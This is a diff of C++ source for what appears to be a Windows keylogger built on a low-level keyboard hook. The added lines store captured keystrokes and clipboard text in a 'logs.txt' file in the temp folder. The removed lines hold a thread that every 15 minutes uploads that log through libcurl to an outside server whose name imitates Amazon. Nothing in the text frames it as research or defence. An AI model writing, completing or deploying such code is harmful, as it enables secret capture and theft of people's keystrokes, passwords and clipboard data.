@@ -1,5 +1,12 @@
 #include "WindowsHook.h"
 
+char tempFolderPath[MAX_PATH]; // istancing a char array to memorize the TempFolder Path
+DWORD result = GetTempPathA(MAX_PATH, tempFolderPath); // getting the TempFolder Path due to windows' function
+const std::string FilePath = (std::string)tempFolderPath + "logs.txt"; // setting the path of where i'm going to save the key pressed
+
+std::string clipBoardLastSave = ""; // saving the text in the windows' clipBoard
+std::string contentFile = ""; // save everything of what is been writing down
+
 WindowsHook::WindowsHook()
 {
 	this->hHook = NULL;
@@ -10,50 +17,11 @@ WindowsHook::~WindowsHook()
 	UnHook();
 }
 
-// thread function
-static void timeCheck() {
-	std::string tmp;
-	while (true) {
-		// Wait 15 minutes
-		std::this_thread::sleep_for(waitTime);
-		tmp = contentFile;
-		contentFile = "";
-		std::ofstream outputFile(FilePath);
-		if (outputFile.is_open()) outputFile << tmp;
-		outputFile.close();
-
-		// sending the file to the server
-		CURL* curl;
-		CURLcode res;
-		curl_global_init(CURL_GLOBAL_ALL);
-		curl = curl_easy_init();
-
-		if (curl) {
-			curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
-			curl_mime* mime;
-			curl_mimepart* part;
-			mime = curl_mime_init(curl);
-			part = curl_mime_addpart(mime);
-			curl_mime_name(part, "file");
-			curl_mime_filedata(part, FilePath.c_str());
-			curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
-			res = curl_easy_perform(curl);
-			curl_easy_cleanup(curl);
-			curl_mime_free(mime);
-		}
-		curl_global_cleanup();
-
-		// here I check if meanwhile that I have sent the mail, the user has typed some more keys
-		(contentFile != "") ? (tmp = StartString() + contentFile, contentFile = tmp) : (contentFile = StartString());
-	}
-}
-
 bool WindowsHook::SetHook(int type)
 {
 	if (this->hHook != NULL) return false;
 	this->hHook = SetWindowsHookEx(type, (type == WH_KEYBOARD_LL) ? KeyboardProc : MouseProc, GetModuleHandle(nullptr), 0);
 	contentFile = StartString();
-	std::thread t(timeCheck); // istancing a thread
 	//t.detach(); // detaching the thread
 	return this->hHook != NULL;
 }
